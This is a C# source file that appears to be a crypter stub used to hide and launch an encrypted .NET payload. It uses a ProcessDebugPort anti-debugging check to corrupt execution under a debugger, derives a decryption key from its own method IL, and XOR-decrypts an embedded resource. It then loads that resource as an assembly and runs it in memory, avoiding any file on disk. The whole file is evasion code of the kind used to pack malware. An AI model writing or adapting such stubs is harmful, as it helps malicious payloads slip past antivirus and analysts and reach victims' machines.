using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Stub
{
    static class Program
    {
        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        public static extern int NtQueryInformationProcess([In] IntPtr ProcessHandle, [In] int ProcessInformationClass, out IntPtr ProcessInformation, [In] int ProcessInformationLength, [Optional] out int ReturnLength);



        [STAThread]
        static void Main()
        {
            int ReturnLength;
            IntPtr DebugPort = new IntPtr(0);
            Module module = new StackTrace().GetFrame(0).GetMethod().Module;
            NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7, out DebugPort, Marshal.SizeOf(DebugPort), out ReturnLength);
            var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Name_Resource");
            byte[] Data = new byte[stream.Length + DebugPort.ToInt32()];
            stream.Read(Data, 0 + DebugPort.ToInt32(), Data.Length + DebugPort.ToInt32());
            NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7, out DebugPort, Marshal.SizeOf(DebugPort), out ReturnLength);
            byte[] Key = module.Assembly.ManifestModule.ResolveMethod(123456789 + DebugPort.ToInt32()).GetMethodBody().GetILAsByteArray();
            Data = Decrypt(Data, Key);
            Assembly asm = Assembly.Load(Data);
            NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 7, out DebugPort, Marshal.SizeOf(DebugPort), out ReturnLength);
            MethodInfo method = asm.EntryPoint;
            object obj = asm.CreateInstance(method.ToString());
            method.Invoke(obj, null);
        }
        public static byte[] Decrypt(byte[] plain, byte[] Key)
        {
            byte[] key = Key;
            for (int round = 0; round < 5; round++)
            {
                for (int i = 0; i < plain.Length; i++)
                {
                    plain[i] = (byte)(plain[i] ^ key[i % key.Length]);
                    for (int k = 0; k < key.Length; k++) plain[i] = (byte)(plain[i] ^ ((((key[k] << round) ^ k) + i)));
                }
            }
            return plain;
        }

        public static byte[] Decompress(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
            {
                dstream.CopyTo(output);
            }
            return output.ToArray();
        }
    }
}
